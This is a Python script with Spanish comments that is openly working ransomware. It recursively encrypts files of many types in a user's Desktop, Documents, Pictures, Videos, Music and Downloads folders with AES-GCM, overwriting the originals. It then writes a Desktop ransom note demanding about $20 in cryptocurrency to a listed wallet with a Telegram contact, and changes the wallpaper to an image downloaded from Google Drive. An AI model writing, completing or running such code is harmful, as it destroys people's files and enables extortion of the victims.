import ctypes
import platform
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
import subprocess
import os
import requests

# Definir las carpetas o archivos a encriptar
user_folders = [
    os.path.join(os.path.expanduser("~"), "Desktop"),
    os.path.join(os.path.expanduser("~"), "Pictures"),
    os.path.join(os.path.expanduser("~"), "Videos"),
    os.path.join(os.path.expanduser("~"), "Music"),
    os.path.join(os.path.expanduser("~"), "Downloads"),
    os.path.join(os.path.expanduser("~"), "Documents")
]

# Extensiones de archivos a encriptar
file_extensions = {
    ".exe", ".dll", ".so", ".rpm", ".deb", ".vmlinuz", ".img",
    ".jpg", ".jpeg", ".bmp", ".gif", ".png", ".svg", ".psd", ".raw",
    ".mp3", ".mp4", ".m4a", ".aac", ".ogg", ".flac", ".wav", ".wma", ".aiff", ".ape",
    ".avi", ".flv", ".m4v", ".mkv", ".mov", ".mpg", ".mpeg", ".wmv", ".swf", ".3gp",
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".odt", ".odp", ".ods", ".txt", ".rtf", ".tex", ".pdf", ".epub", ".md",
    ".yml", ".yaml", ".json", ".xml", ".csv",
    ".db", ".sql", ".dbf", ".mdb", ".iso",
    ".html", ".htm", ".xhtml", ".php", ".asp", ".aspx", ".js", ".jsp", ".css",
    ".c", ".cpp", ".cxx", ".h", ".hpp", ".hxx",
    ".java", ".class", ".jar",
    ".ps", ".bat", ".vb",
    ".awk", ".sh", ".cgi", ".pl", ".ada", ".swift",
    ".go", ".py", ".pyc", ".bf", ".coffee",
    ".zip", ".tar", ".tgz", ".bz2", ".7z", ".rar", ".bak",
    ".wasted"
}

# Genera una clave AES a partir de una contraseña
password = "strong_password"  # Cambia esto por una contraseña segura
salt = get_random_bytes(16)
key = PBKDF2(password, salt, dkLen=32)  # Clave de 256 bits

# Función para encriptar un archivo
def encrypt_file(file_path):
    try:
        if file_path.startswith("~$") or file_path.endswith(".tmp"):
            print(f"Archivo temporal o bloqueado, saltando: {file_path}")
            return  # Saltar archivos temporales

        with open(file_path, "rb") as file:
            plaintext = file.read()
        
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        
        with open(file_path, "wb") as file:
            file.write(salt)          # Salt
            file.write(cipher.nonce)   # Nonce para AES-GCM
            file.write(tag)            # Tag para verificar la integridad
            file.write(ciphertext)     # Datos encriptados

    except PermissionError:
        print(f"No se pudo encriptar el archivo debido a permisos insuficientes: {file_path}")
    except Exception as e:
        print(f"Ocurrió un error al procesar el archivo {file_path}: {str(e)}")

# Función para cambiar el fondo de pantalla
def change_wallpaper(image_path):
    system = platform.system()
    
    if system == "Windows":
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
    elif system == "Darwin":  # macOS
        script = f'''
        osascript -e 'tell application "System Events" to set picture of every desktop to "{image_path}"'
        '''
        subprocess.run(script, shell=True, check=True)
    else:
        print("Cambio de fondo de pantalla no soportado en este sistema operativo")

# Descargar la imagen de Google Drive
def download_image(url, path):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Verifica errores de descarga
        with open(path, "wb") as file:
            file.write(response.content)
        print("Imagen descargada exitosamente.")
    except Exception as e:
        print(f"Error al descargar la imagen: {e}")

# Busca y encripta archivos en las carpetas definidas
for folder in user_folders:
    if os.path.exists(folder):
        for root, dirs, files in os.walk(folder):
            for filename in files:
                file_path = os.path.join(root, filename)
                
                if filename.startswith("~$") or filename.endswith(".tmp"):
                    print(f"Archivo temporal o bloqueado, saltando: {file_path}")
                    continue  # Continuar con el siguiente archivo
                
                if any(file_path.endswith(ext) for ext in file_extensions):
                    encrypt_file(file_path)
                    print(f"Archivo encriptado: {file_path}")
    else:
        print(f"La carpeta {folder} no existe.")

# Crear un archivo de mensaje después de la encriptación en el escritorio
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
message_file_path = os.path.join(desktop_path, "mensaje.txt")
with open(message_file_path, "w") as message_file:
    message_file.write("Has sido encriptado, deposita lo equivalente a 20 dolares en esta billetera cripto 13HXmkfQrtW2vrnG7mtS4Fs1dQqpcWhM5R y comunicate a telegram con el usuario xXdestroyerXx ")
print(f"Mensaje de encriptación creado en el escritorio: {message_file_path}")

# Descargar la imagen de Google Drive y cambiar el fondo de pantalla
image_url = "https://drive.google.com/uc?export=download&id=1ZWI9JihyYfqTA0S8D_ZlJh5d0XcNynR_"
image_path = os.path.join(os.path.expanduser("~"), "DownloadedWallpaper.jpg")

download_image(image_url, image_path)
change_wallpaper(image_path)
